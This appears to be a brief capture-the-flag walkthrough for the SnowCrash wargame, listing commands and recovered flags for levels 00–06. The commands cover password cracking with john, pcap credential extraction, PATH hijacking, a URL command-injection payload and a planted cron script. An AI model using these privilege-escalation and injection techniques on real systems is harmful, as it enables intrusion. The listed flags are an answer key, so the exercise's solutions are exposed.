
Image: `/sgoinfre/goinfre/ISO/SnowCrash.iso`  

## Level00

`ssh -l level00 -p <port> 127.0.0.1`  
```
find / -user flag00 2>/dev/null
strings /usr/sbin/john
```
-> multi decoder  

`ssh -l flag00 -p <port> 127.0.0.1`
```
getflag
```

> `level00`
> `nottoohardhere`

## Level01

```
docker run --rm -it debian:latest
apt-get update && apt-get -y install john
cat <<_EOF > /root/passwd.txt
<paste content of /etc/passwd file>
_EOF
```

> `x24ti5gi3x0ol2eh4esiuxias`
> `abcdefg`

## Level02

```
scp -P <port> level02@localhost:/home/user/level02/level02.pcap /tmp
chmod u+r /tmp/level02.pcap
```
-> wireshark -> follow TCP stream  

> `f2av5il02puano7naaf6adaaf`
> `ft_waNDReL0L`

## Level03

```
strings ~/level03
PATH=/tmp:$PATH
ln -s /bin/getflag /tmp/echo
~/level03
```

> `kooda2puivaav1idi4f57q8iq`

## Level04

```
curl 'localhost:4747?x=a%3Bgetflag'
```

> `qi0maab88jeaj46qoumi7maus`

## Level05

```
cat <<_EOF > /opt/openarenaserver/level05.sh
#!/bin/sh
getflag >/tmp/flag.txt 2>&1
_EOF
watch -n 1 cat /tmp/flag.txt
```
> `ne2searoevaevoem4ov4ar8ap`

## Level06

> `viuaaale9huek52boumoomioc`


